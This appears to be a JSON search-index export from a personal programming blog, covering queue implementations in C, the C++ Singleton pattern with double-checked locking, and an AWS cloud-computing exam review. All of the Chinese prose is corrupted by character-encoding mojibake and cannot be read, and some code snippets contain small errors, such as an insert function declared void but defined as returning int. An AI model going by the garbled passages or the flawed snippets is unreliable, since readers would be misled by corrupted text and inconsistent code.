å…³è¯­æ³•åŠåˆ†æ è‡ªé¡¶å‘ä¸‹åˆ†æ è‡ªåº•å‘ä¸Šåˆ†æ ä½¿ç”¨Bisonåšè¯­æ³•åˆ†æ Pythonç¼–è¯‘å™¨ ","date":1538744667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538744667,"objectID":"2e5197ff472ee2898c3746c3733e6318","permalink":"http://www.guozet.me/post/Translation-of-Programming-Languages-index/","publishdate":"2018-10-05T13:04:27Z","relpermalink":"/post/Translation-of-Programming-Languages-index/","section":"post","summary":"\nç¼–è¯‘åŸç†è¿™é—¨è¯¾ç¨‹æ˜¯æˆ‘åœ¨CUçš„2018 Fallé€‰ä¿®çš„ä¸€é—¨ä¸“ä¸šæ ¸å¿ƒè¯¾ç¨‹ï¼Œè€å¸ˆæ˜¯Clemson CSç³»æ¯”è¾ƒå—æ¬¢è¿çš„ Brian Malloyæ•™æˆã€‚åœ¨ä»–çš„ä¸ªäººä¸»é¡µä¸Šé¢ä¹Ÿæœ‰Python, C++ï¼Œ 2Dæ¸¸æˆçš„æ•™ç¨‹ï¼Œéå¸¸é€‚åˆå¯¹CSæ„Ÿå…´è¶£çš„åŒå­¦å­¦ä¹ ã€‚\n","tags":["C++","Translation","Flex","Bision"],"title":"Translation of Programming Languages(CU CPSC8270)","type":"post"},{"authors":null,"categories":"Algorithm","content":"Abstract Data Type What is the abstract data type? Specification of a data structure in terms of the operations it needs to support.\nJust a concrete(å…·ä½“åŒ–) approach for implementation of a data structure that fulfills these requiremnts.\nQueues (FIFO behavior) Sometimes, we need a structure which can do these two things.\nInsert a new key k into the structure Remove the least-recently-inserted key from the structure. But, how can we use the bacis structure arrays, list, stacks to implement the queues. Firstly, we can\u0026rsquo;t use the stacks to implement it. So, we try to implement the queues by arrays and list.\nCircular array class Queue{ public: Queue(); ~Queue(); void insert(int key); int remove(void); private: int *A; int front, back, N; } int Queue::remove(void) { int result = A[back]; back = (back+1) % N; return result; } int Queue::insert(int x) { A[front] = x; front = (front+1) % N; } Linked list // A C program to demonstrate linked list based implementation of queue #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; // A linked list (LL) node to store a queue entry struct QNode { int key; struct QNode *next; }; // The queue, front stores the front node of LL and rear stores ths // last node of LL struct Queue { struct QNode *front, *rear; }; // A utility function to create a new linked list node. struct QNode *newNode(int k) { struct QNode *temp = (struct QNode *)malloc(sizeof(struct QNode)); temp-\u0026gt;key = k; temp-\u0026gt;next = NULL; return temp; } // A utility function to create an empty queue struct Queue *createQueue() { struct Queue *q = (struct Queue *)malloc(sizeof(struct Queue)); q-\u0026gt;front = q-\u0026gt;rear = NULL; return q; } // The function to add a key k to q void enQueue(struct Queue *q, int k) { // Create a new LL node struct QNode *temp = newNode(k); // If queue is empty, then new node is front and rear both if (q-\u0026gt;rear == NULL) { q-\u0026gt;front = q-\u0026gt;rear = temp; return; } // Add the new node at the end of queue and change rear q-\u0026gt;rear-\u0026gt;next = temp; q-\u0026gt;rear = temp; } // Function to remove a key from given queue q struct QNode *deQueue(struct Queue *q) { // If queue is empty, return NULL. if (q-\u0026gt;front == NULL) return NULL; // Store previous front and move front one node ahead struct QNode *temp = q-\u0026gt;front; q-\u0026gt;front = q-\u0026gt;front-\u0026gt;next; // If front becomes NULL, then change rear also as NULL if (q-\u0026gt;front == NULL) q-\u0026gt;rear = NULL; return temp; } // Driver Program to test anove functions int main() { struct Queue *q = createQueue(); enQueue(q, 10); enQueue(q, 20); deQueue(q); deQueue(q); enQueue(q, 30); enQueue(q, 40); enQueue(q, 50); struct QNode *n = deQueue(q); if (n != NULL) printf(\u0026quot;Dequeued item is %d\u0026quot;, n-\u0026gt;key); return 0; } Queues Example Question: Given N numbers, do two of them sum to 42 We can find the number which is equal to 42-X for each number X. There are two steps for this question.\nSort the numbers. ) For each number X in the array, use Binary search to see if 42-X is also present in the array. \u0026laquo;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-TODO:\u0026ndash;Not Finshed\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026raquo;\n","date":1538705371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538705371,"objectID":"a86077f7e2a533fe2dc5a199fc36dddd","permalink":"http://www.guozet.me/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/","publishdate":"2018-10-05T02:09:31Z","relpermalink":"/post/CPSC2120-Algorithm-Abstract-Data-TypeHashtable/","section":"post","summary":"Abstract Data Type What is the abstract data type? Specification of a data structure in terms of the operations it needs to support. Just a concr","tags":"Algorithm","title":"Algorithm Introduce 2 - Abstract Data types and Hash Tables","type":"post"},{"authors":null,"categories":"C++","content":"\nä»€ä¹ˆæ˜¯Singleton? å•ä¾‹æ¨¡å¼ï¼ˆSingletonï¼‰ï¼Œä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚\nå¯ä»¥è€ƒè™‘åœ¨ä¸‹é¢çš„ä¸€äº›åœºæ™¯ä¸­åº”ç”¨ï¼š\nWindowsçš„Task Managerï¼ˆä»»åŠ¡ç®¡ç†å™¨ï¼‰å°±æ˜¯å¾ˆå…¸å‹çš„å•ä¾‹æ¨¡å¼ï¼ˆè¿™ä¸ªå¾ˆç†Ÿæ‚‰å§ï¼‰ï¼Œæƒ³æƒ³çœ‹ï¼Œæ˜¯ä¸æ˜¯å‘¢ï¼Œä½ èƒ½æ‰“å¼€ä¸¤ä¸ªwindows task managerå—ï¼Ÿ ä¸ä¿¡ä½ è‡ªå·±è¯•è¯•çœ‹å“¦~Â windowsçš„Recycle Binï¼ˆå›æ”¶ç«™ï¼‰ä¹Ÿæ˜¯å…¸å‹çš„å•ä¾‹åº”ç”¨ã€‚åœ¨æ•´ä¸ªç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå›æ”¶ç«™ä¸€ç›´ç»´æŠ¤ç€ä»…æœ‰çš„ä¸€ä¸ªå®ä¾‹ã€‚ ç½‘ç«™çš„è®¡æ•°å™¨ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼å®ç°ï¼Œå¦åˆ™éš¾ä»¥åŒæ­¥ã€‚ åº”ç”¨ç¨‹åºçš„æ—¥å¿—åº”ç”¨ï¼Œä¸€èˆ¬éƒ½ä½•ç”¨å•ä¾‹æ¨¡å¼å®ç°ï¼Œè¿™ä¸€èˆ¬æ˜¯ç”±äºå…±äº«çš„æ—¥å¿—æ–‡ä»¶ä¸€ç›´å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œå› ä¸ºåªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹å»æ“ä½œï¼Œå¦åˆ™å†…å®¹ä¸å¥½è¿½åŠ ã€‚ Webåº”ç”¨çš„é…ç½®å¯¹è±¡çš„è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿåº”ç”¨å•ä¾‹æ¨¡å¼ï¼Œè¿™ä¸ªæ˜¯ç”±äºé…ç½®æ–‡ä»¶æ˜¯å…±äº«çš„èµ„æºã€‚ åœ¨æ•°æ®åº“è¿æ¥æ± çš„è®¾è®¡ä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼ï¼Œå› ä¸ºæ•°æ®åº“è¿æ¥æ˜¯ä¸€ç§æ•°æ®åº“èµ„æºã€‚æ•°æ®åº“è½¯ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨æ•°æ®åº“è¿æ¥æ± ï¼Œä¸»è¦æ˜¯èŠ‚çœæ‰“å¼€æˆ–è€…å…³é—­æ•°æ®åº“è¿æ¥æ‰€å¼•èµ·çš„æ•ˆç‡æŸè€—ï¼Œè¿™ç§æ•ˆç‡ä¸Šçš„æŸè€—è¿˜æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œå› ä¸ºä½•ç”¨å•ä¾‹æ¨¡å¼æ¥ç»´æŠ¤ï¼Œå°±å¯ä»¥å¤§å¤§é™ä½è¿™ç§æŸè€—ã€‚ å¤šçº¿ç¨‹çš„çº¿ç¨‹æ± çš„è®¾è®¡ä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼ï¼Œè¿™æ˜¯ç”±äºçº¿ç¨‹æ± è¦æ–¹ä¾¿å¯¹æ± ä¸­çš„çº¿ç¨‹è¿›è¡Œæ§åˆ¶ã€‚ æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿæ˜¯å¤§çš„å•ä¾‹æ¨¡å¼å®ç°çš„å…·ä½“ä¾‹å­ï¼Œä¸€ä¸ªæ“ä½œç³»ç»Ÿåªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ ä¸Šè¿°å†…å®¹æ¥è‡ªäºï¼š å•ä¾‹æ¨¡å¼çš„å¸¸è§åº”ç”¨åœºæ™¯ å•ä¾‹æ¨¡å¼åº”ç”¨çš„åœºæ™¯ä¸€èˆ¬å‘ç°åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼š\nèµ„æºå…±äº«çš„æƒ…å†µä¸‹ï¼Œé¿å…ç”±äºèµ„æºæ“ä½œæ—¶å¯¼è‡´çš„æ€§èƒ½æˆ–æŸè€—ç­‰ã€‚å¦‚ä¸Šè¿°ä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œåº”ç”¨é…ç½® æ§åˆ¶èµ„æºçš„æƒ…å†µä¸‹ï¼Œæ–¹ä¾¿èµ„æºä¹‹é—´çš„äº’ç›¸é€šä¿¡ã€‚å¦‚çº¿ç¨‹æ± ç­‰ã€‚ å¦‚æœä¸ä½¿ç”¨å•ä¾‹æ¨¡å¼æ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿ åº”ç”¨åœºæ™¯ï¼š æˆ‘ä»¬ä½¿ç”¨srand(time(0))å»ç”Ÿäº§ä¸€ä¸ªéšæœºæ•°å­—ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¾ˆå¿«çš„é¢‘ç‡å»è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„è¯ï¼Œå°±ä¼šå‡ºç°è¿™ä¸ªå‡½æ•°ç»™å‡ºä¸€ä¸ªåŒæ ·çš„éšæœºæ•°å­—ã€‚\n#include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: Random() { int seed = time(0); srand(seed); } int operator()(int a, int b) const { return (rand() % b) + a; } private: Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); }; int main() { Random random; std::cout \u0026lt;\u0026lt; random(1, 100) \u0026lt;\u0026lt; std::endl; } Output:\n$./run 44 $./run //å’Œç¬¬ä¸€æ¬¡é—´éš”æ—¶é—´æ¯”è¾ƒé•¿ 72 $./run //åé¢ä¸‰ä¸ªè¿è¡Œç¨‹åºçš„é€Ÿåº¦æ¯”è¾ƒå¿«çš„è¯ï¼Œå°±ä¼šå‡ºç°å¾—åˆ°ä¸€æ ·çš„éšæœºæ•° 44 $./run 44 $./run 44 Function rand () Vs srand()\nrand() function is used in C to generate random numbers. If we generate a sequence of random number with rand() function, it will create the same sequence again and again every time program runs. Say if we are generating 5 random numbers in C with the help of rand() in a loop, then every time we compile and run the program our output must be the same sequence of numbers. The srand() function sets the starting point for producing a series of pseudo-random integers. If srand() is not called, the rand() seed is set as if srand(1) were called at program start. Any other value for seed sets the generator to a different starting point. Standard prac tice is to use the result of a call to srand(time(0)) as the seed ä½¿ç”¨å•ä¾‹æ¨¡å¼ å•ä¸€æ¨¡å¼çš„å®ç°æ–¹å¼ï¼š\nPlace constructors and assignment in private section. Declare a static instance variable as a data attribute of the class Define the static instance variable somewhere in the anonymous namespace. Define a static class member function(getInstance) to access the instance variable. glutå®ç°æ¨¡å¼ (æ‡’æ±‰æ¨¡å¼ï¼ˆçº¿ç¨‹ä¸å®‰å…¨ï¼‰) #include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: static Random* getInstance(); //Define a static class member function int operator()(int a, int b) const { return (rand() % b) + a; } private: static Random* instance; //Declare a static instance variable Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); // Constructors and assignment in private Random() { int seed = time(0); srand(seed); } }; Random* Random::getInstance() { if ( !instance ) instance = new Random; return instance; } Random* Random::instance = NULL; //Define the static instance variable somewherr int main() { Random* random = Random::getInstance(); std::cout \u0026lt;\u0026lt; (*random)(1,100) \u0026lt;\u0026lt; std::endl; delete random; } è¿™ç§glutçš„å•ä¾‹æ¨¡å¼å­˜åœ¨è¿™ä¸€å®šçš„é—®é¢˜ï¼Œåœ¨ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹ä¸­ç»™å‡ºäº†ä¸€ä¸ªä¾‹å­ã€‚åœ¨å•ä¾‹æ¨¡å¼ä¸­ï¼Œè¿™æ˜¯ä¸€æ®µå…¸å‹çš„ double-check çš„ä»£ç .\nvolatile T* pInst = nullptr; T* GetInstance() { if (nullptr == pInst) { lock(); if (nullptr == pInst) { pInst = new T; } unlock(); } return pInst; } if (nulptr == pInst) ä¸­çš„if ç¡®ä¿ä»…åœ¨ pInst æ˜¯ç©ºæŒ‡é’ˆçš„æƒ…å†µä¸‹æ‰å»è·å–é”å¹¶å°è¯•æ„é€ å¯¹è±¡ï¼› if (nullptr == pInst) çš„ if åˆ™æ˜¯ä¸ºäº†é˜²æ­¢è¿™æ ·ä¸€ç§å¯èƒ½ï¼Œé¿å…é‡å¤æ“ä½œå’Œå†…å­˜æ³„éœ²ï¼šåœ¨å¤–å±‚ if æ£€æµ‹æ˜¯ï¼ŒpInst å°šä¸ºç©ºï¼Œä½†æ˜¯ï¼Œå¾… lock() æ‰§è¡Œå®Œæ¯•åï¼Œåˆ«çš„çº¿ç¨‹å·²ç»ä¸º pInst èµ‹å€¼ã€‚ è¿™æ®µä»£ç ï¼Œä¹ä¸€çœ‹æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼›ä½†ä»éœ€å°å¿ƒæ£æ‘©ã€‚æˆ‘ä»¬çœ‹ pInst = new T; è¿™ä¸€è¡Œä»£ç ï¼Œå®ƒåŸºæœ¬å®Œæˆäº†ä¸‰ä»¶äº‹æƒ…\nä¸º T ç±»å‹çš„å¯¹è±¡åˆ†é…å†…å­˜ï¼› åœ¨è¿™ç‰‡å†…å­˜ä¸Šæ‰§è¡Œ T çš„æ„é€ å‡½æ•°ï¼› å°†è¿™ç‰‡å†…å­˜çš„èµ·å§‹åœ°å€èµ‹å€¼ç»™ pInstã€‚ ç”±äºæ„é€ å‡½æ•°çš„æ‰§è¡Œå’ŒæŒ‡é’ˆçš„èµ‹å€¼æ˜¯äº’ä¸ä¾èµ–çš„ï¼Œæ‰€ä»¥ CPU å¯èƒ½ä¼šäº¤æ¢è¿™ä¸¤ä¸ªæ­¥éª¤çš„é¡ºåºã€‚å› æ­¤ï¼Œåœ¨çº¿ç¨‹æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å­˜åœ¨è¿™æ ·ä¸€ç§æƒ…å†µï¼šnullptr != pInstï¼Œä½†æ˜¯å®ƒæŒ‡å‘çš„å¯¹è±¡å°šæœªæ„é€ æˆåŠŸã€‚äºæ˜¯ï¼Œå¦‚æœåœ¨è¿™ä¸€æ—¶åˆ»ï¼Œå½“å‰çº¿ç¨‹è¢«ä¸­æ–­ï¼Œå¹¶ä¸”å…¶å®ƒçº¿ç¨‹è°ƒç”¨ GetInstance å‡½æ•°ï¼Œé‚£ä¹ˆå‡½æ•°åœ¨å¤–å±‚ if æ‰§è¡Œä¹‹åï¼Œä¼šç›´æ¥è¿”å› pInst çš„å€¼ã€‚è€Œæ­¤æ—¶ pInst å®é™…ä¸ŠæŒ‡å‘çš„æ˜¯ä¸€ç‰‡å°šæœªåˆå§‹åŒ–çš„å†…å­˜ã€‚å¦‚æœçº¿ç¨‹ä»£ç å¯¹ pInst è¿›è¡Œè®¿é—®ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å°±ä¼šå´©æºƒã€‚\nä¸ºäº†è§£å†³è¿™ç±» CPU åŠ¨æ€è°ƒåº¦å¯¼è‡´çš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æœ‰åœ¨æŸäº›æƒ…å†µä¸‹é˜»æ­¢æŒ‡ä»¤æ¢åºæ‰§è¡Œçš„èƒ½åŠ›ã€‚ç„¶è€Œé—æ†¾çš„æ˜¯ï¼Œç”±äºåŠ¨æ€è°ƒåº¦æ˜¯ CPU çš„åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨é«˜çº§è¯­è¨€çš„å±‚æ¬¡ï¼Œæˆ‘ä»¬æ²¡æœ‰é€šç”¨çš„è§£å†³åŠæ³•â€”â€”åªèƒ½ä¾èµ–å…·ä½“çš„ CPU æ¶æ„ï¼Œå¯¹ä»£ç è¿›è¡Œè°ƒæ•´ã€‚å¯¹äº i386 æ¶æ„çš„ CPU æ¥è¯´ï¼Œå®ƒæä¾›äº†ä¸€æ¡æŒ‡ä»¤ mfenceï¼ˆmemory fence çš„ç¼©å†™ï¼‰ï¼Œå¯ä»¥é˜»æ­¢è¿™ç§æ¢åºæ‰§è¡Œã€‚\n#define barrier() __asm__ volatile(\u0026quot;mfence\u0026quot;) volatile T* pInst = nullptr; T* GetInstance() { if (nullptr == pInst) { lock(); if (nullptr == pInst) { T* temp = new T; barrier(); pInst = temp; } unlock(); } return pInst; } ç”¨ barrier() ä¿è¯äº†åœ¨ pInst è¢«èµ‹å€¼ä¹‹å‰ï¼Œç›¸å…³å†…å­˜åŒºåŸŸå·²ç»æ­£ç¡®åœ°åˆå§‹åŒ–äº†ã€‚\nMeyerså•ä¾‹æ¨¡å¼å®ç° #include \u0026lt;cstdlib\u0026gt; // for rand() #include \u0026lt;iostream\u0026gt; class Random { public: static Random\u0026amp; getInstance(); int operator()(int a, int b) const { return (rand() % b) + a; } private: Random(const Random\u0026amp;); Random\u0026amp; operator=(const Random\u0026amp;); Random() { int seed = time(0); srand(seed); } }; Random\u0026amp; Random::getInstance() { static Random instance; return instance; } int main() { Random\u0026amp; random = Random::getInstance(); std::cout \u0026lt;\u0026lt; random(1,100) \u0026lt;\u0026lt; std::endl; } ç¬¬äºŒç§å®ç°æ–¹å¼å’Œä¹‹å‰ä¸€ç§å®ç°æ–¹å¼çš„åŒºåˆ«åœ¨ï¼š ç¬¬ä¸€ç§\næ‡’æ±‰æ¨¡å¼ç”³æ˜äº†ä¸€ä¸ªé™æ€å¯¹è±¡ï¼Œåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶åˆå§‹åŒ–ï¼Œè™½ç„¶èŠ‚çº¦äº†èµ„æºï¼Œä½†ç¬¬ä¸€æ¬¡åŠ è½½æ—¶éœ€è¦å®ä¾‹åŒ–ï¼Œåæ˜ ç¨æ…¢ä¸€äº›ï¼Œè€Œä¸”åœ¨å¤šçº¿ç¨‹ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚ //First one Random* Random::getInstance() { if ( !instance ) instance = new Random; return instance; } Random* Random::instance = NULL; //Define the static instance variable somewherr ç¬¬äºŒç§ï¼š\nåœ¨ç±»åŠ è½½æ—¶å°±å®Œæˆäº†åˆå§‹åŒ–ï¼Œæ‰€ä»¥ç±»åŠ è½½è¾ƒæ…¢ï¼Œä½†è·å–å¯¹è±¡çš„é€Ÿåº¦å¿«ã€‚ è¿™ç§æ–¹å¼åŸºäºç±»åŠ è½½æœºåˆ¶é¿å…äº†å¤šçº¿ç¨‹çš„åŒæ­¥é—®é¢˜ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ç¡®å®šæœ‰å…¶ä»–çš„æ–¹å¼ï¼ˆæˆ–è€…å…¶ä»–çš„é™æ€æ–¹æ³•ï¼‰å¯¼è‡´ç±»è£…è½½ï¼Œè¿™æ—¶å€™åˆå§‹åŒ–instanceæ˜¾ç„¶æ²¡æœ‰è¾¾åˆ°æ‡’åŠ è½½çš„æ•ˆæœã€‚ //Second One Random\u0026amp; Random::getInstance() { static Random instance; return instance; } æ¨èé˜…è¯»ï¼š è®¾è®¡æ¨¡å¼ï¼ˆäºŒï¼‰å•ä¾‹æ¨¡å¼çš„ä¸ƒç§å†™æ³•\n","date":1538665771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1538665771,"objectID":"6fe0315a7dbe20f866c29554abd3ba37","permalink":"http://www.guozet.me/post/C++Singleton-pattern/","publishdate":"2018-10-04T15:09:31Z","relpermalink":"/post/C++Singleton-pattern/","section":"post","summary":"\nä»€ä¹ˆæ˜¯Singleton? å•ä¾‹æ¨¡å¼ï¼ˆSingletonï¼‰ï¼Œä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚\nå¯ä»¥è€ƒè™‘åœ¨ä¸‹é¢çš„ä¸€äº›åœºæ™¯ä¸­åº”ç”¨ï¼š\nWindowsçš„Task Managerï¼ˆä»»åŠ¡ç®¡ç†å™¨ï¼‰å°±æ˜¯å¾ˆå…¸å‹çš„å•ä¾‹æ¨¡å¼ï¼ˆè¿™ä¸ªå¾ˆç†Ÿæ‚‰å§ï¼‰ï¼Œæƒ³æƒ³çœ‹ï¼Œæ˜¯ä¸æ˜¯å‘¢ï¼Œä½ èƒ½æ‰“å¼€ä¸¤ä¸ªwindows task managerå—ï¼Ÿ ä¸ä¿¡ä½ è‡ªå·±è¯•è¯•çœ‹å“¦~Â windowsçš„Recycle Binï¼ˆå›æ”¶ç«™ï¼‰ä¹Ÿæ˜¯å…¸å‹çš„å•ä¾‹åº”ç”¨ã€‚åœ¨æ•´ä¸ªç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå›æ”¶ç«™ä¸€ç›´ç»´æŠ¤ç€ä»…æœ‰çš„ä¸€ä¸ªå®ä¾‹ã€‚ ç½‘ç«™çš„è®¡æ•°å™¨ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼å®ç°ï¼Œå¦åˆ™éš¾ä»¥åŒæ­¥ã€‚ åº”ç”¨ç¨‹åºçš„æ—¥å¿—åº”ç”¨ï¼Œä¸€èˆ¬éƒ½ä½•ç”¨å•ä¾‹æ¨¡å¼å®ç°ï¼Œè¿™ä¸€èˆ¬æ˜¯ç”±äºå…±äº«çš„æ—¥å¿—æ–‡ä»¶ä¸€ç›´å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œå› ä¸ºåªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹å»æ“ä½œï¼Œå¦åˆ™å†…å®¹ä¸å¥½è¿½åŠ ã€‚ Webåº”ç”¨çš„é…ç½®å¯¹è±¡çš„è¯»å–ï¼Œä¸€èˆ¬ä¹Ÿåº”ç”¨å•ä¾‹æ¨¡å¼ï¼Œè¿™ä¸ªæ˜¯ç”±äºé…ç½®æ–‡ä»¶æ˜¯å…±äº«çš„èµ„æºã€‚ åœ¨æ•°æ®åº“è¿æ¥æ± çš„è®¾è®¡ä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼ï¼Œå› ä¸ºæ•°æ®åº“è¿æ¥æ˜¯ä¸€ç§æ•°æ®åº“èµ„æºã€‚æ•°æ®åº“è½¯ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨æ•°æ®åº“è¿æ¥æ± ï¼Œä¸»è¦æ˜¯èŠ‚çœæ‰“å¼€æˆ–è€…å…³é—­æ•°æ®åº“è¿æ¥æ‰€å¼•èµ·çš„æ•ˆç‡æŸè€—ï¼Œè¿™ç§æ•ˆç‡ä¸Šçš„æŸè€—è¿˜æ˜¯éå¸¸æ˜‚è´µçš„ï¼Œå› ä¸ºä½•ç”¨å•ä¾‹æ¨¡å¼æ¥ç»´æŠ¤ï¼Œå°±å¯ä»¥å¤§å¤§é™ä½è¿™ç§æŸè€—ã€‚ å¤šçº¿ç¨‹çš„çº¿ç¨‹æ± çš„è®¾è®¡ä¸€èˆ¬ä¹Ÿæ˜¯é‡‡ç”¨å•ä¾‹æ¨¡å¼ï¼Œè¿™æ˜¯ç”±äºçº¿ç¨‹æ± è¦æ–¹ä¾¿å¯¹æ± ä¸­çš„çº¿ç¨‹è¿›è¡Œæ§åˆ¶ã€‚ æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¹Ÿæ˜¯å¤§çš„å•ä¾‹æ¨¡å¼å®ç°çš„å…·ä½“ä¾‹å­ï¼Œä¸€ä¸ªæ“ä½œç³»ç»Ÿåªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ ä¸Šè¿°å†…å®¹æ¥è‡ªäºï¼š å•ä¾‹æ¨¡å¼çš„å¸¸è§åº”ç”¨åœºæ™¯ å•ä¾‹æ¨¡å¼åº”ç”¨çš„åœºæ™¯ä¸€èˆ¬å‘ç°åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼š\nèµ„æºå…±äº«çš„æƒ…å†µä¸‹ï¼Œé¿å…ç”±äºèµ„æºæ“ä½œæ—¶å¯¼è‡´çš„æ€§èƒ½æˆ–æŸè€—ç­‰ã€‚å¦‚ä¸Šè¿°ä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œåº”ç”¨é…ç½® æ§åˆ¶èµ„æºçš„æƒ…å†µä¸‹ï¼Œæ–¹ä¾¿èµ„æºä¹‹é—´çš„äº’ç›¸é€šä¿¡ã€‚å¦‚çº¿ç¨‹æ± ç­‰ã€‚ ","tags":"C++","title":"C++è½¯ä»¶è®¾è®¡æ¨¡å¼ä¹‹Singleton","type":"post"},{"authors":null,"categories":"Cloud computing","content":"Exam_2 Review Questions. Approximately 60% of the exam will be derived from these questions.\nTrue or False: Users should store dynamic web content in S3.\nWhat advantage is there in storing static web content in S3? S3 is reliable, and durable. S3 is simple to ensure static web content is quickly accessible, always available, and secure.\nName four AWS constructs that allow you to control your VPC traffic. Internet gateway, route tables, security group, network access control lists.\nTrue or False: Security groups are stateless and Network ACLs are stateful. Explain what this means. Security group: Return traffic is automatically allowed, regardless of any rules. ACLs: Return traffic must be explicitly allowed by rules.\nWhat is the purpose of an Internet Gateway? Is this a managed AWS service? Yes, itâ€™s a managed AWS service. An Internet gateway serves two purposes: to provide a target in your VPC route tables for Internet-routable traffic, and to perform network address translation (NAT) for instances that have been assigned public IPv4 addresses.\nDescribe the main difference between a public and a private subnet. The main difference is the route for 0.0.0.0/0 in the associated route table. A private subnet sets that route to a NAT instance. Private subnet instances only need a private IP and internet traffic is routed through the NAT in the public subnet. You could also have no route to 0.0.0.0/0 to make it a truly private subnet with no internet access in or out. A public subnet routes 0.0.0.0/0 through an Internet Gateway (igw). Instances in a public subnet require public IPs to talk to the internet.\nExpand each of the following acronyms of the following in the context of this class and provide a short description of what each is:\nRTO Recovery Time Objective, how quickly the system can recover? RPO Recovery Point Objective, how much data can you afford to lose? HA High Availability DNS Domain Name System JSON JavaScript Object Notation SOA Service Oriented Architecturegh What is the difference about On-Premises HA Vs HA on AWS\nOn-Promises HA: 1. very expensive; 2. It\u0026rsquo;s suitable only for mission-critical(æ´¾é£ç¡®å®šçš„) applications. HA on AWS: 1.Multiple services. 2.Isolated redundancy data centers within each availability zone. 3.multiple availability zones within each region. 4. Region across the global. 5.Fault-tolerance service. From 100-CCA-31-EN-U3SG.pdf Module 3.\nList the three main factors associated with High Availability.\nFault tolerance: the built-in redundancy of an applicationâ€™s component(ç»„ä»¶). Recoverability: the process, policies, and procedures related to restoring service after a catastrophic(ç¾éš¾æ€§çš„) event. Scalability: the ability of application to accommodate growth without changing design. What does enabling connection draining on an ELB do? Why is this important? This enables the load balancer to complete in-flight requests made to instances that are de-registering or unhealthy. To ensure that a Classic Load Balancer stops sending requests to instances that are de-registering or unhealthy, while keeping the existing connections open.\nTrue or False: Amazon CloudWatch allows the user to create custom metrics for their specific application.\nWhat are three types of capacity parameters that an Auto Scaling Group defines? Desired, minimum,maximum\nDefine a sample Auto Scale Policy. The scaling policies that you define adjust the number of instances, within your minimum and maximum number of instances, based on the criteria that you specify.\nTrue or False: When using Auto Scaling, you should be more cautious scaling in and try to avoid aggressive instance termination.\nWhat are three languages AWS Lambda currently supports? Python, JavaScript, java, c#\nWhat AWS Service can be classified as Infrastructure as Code? AWS CloudFormation\nDefine AWS CloudFormation. AWS CloudFormation is a service that can be classified as infrastructure as code.\nList seven possible sections that can be included in a AWS CloudFormation Template. Description, metadata, parameters, mappings, conditions, transform, resources.\nTrue or False: The more loosely your system is coupled the more easily it scales.\nDefine Services in the context of a SOA. Services are self-contained units of functionality.\nDefine a Microservice and give an example. Microservice: Small, independent processes within an SOA. Each process is focused on doing one small task. Processes communicate to each other using language-agnostic APIs. Example: SNS? Use application load balancer with EC2 container service and auto scaling to implement mircoservice application.\nWhat AWS Service provides a fully managed message queueing service? SQS: Amazon Simple Queue Service is a fully managed message queueing service. Transmit any volume of messages at any level of throughput without losing messages or requiring other services to be always available.\nWhat is a dead letter queue? A dead letter queue is a queue of messages that could not be 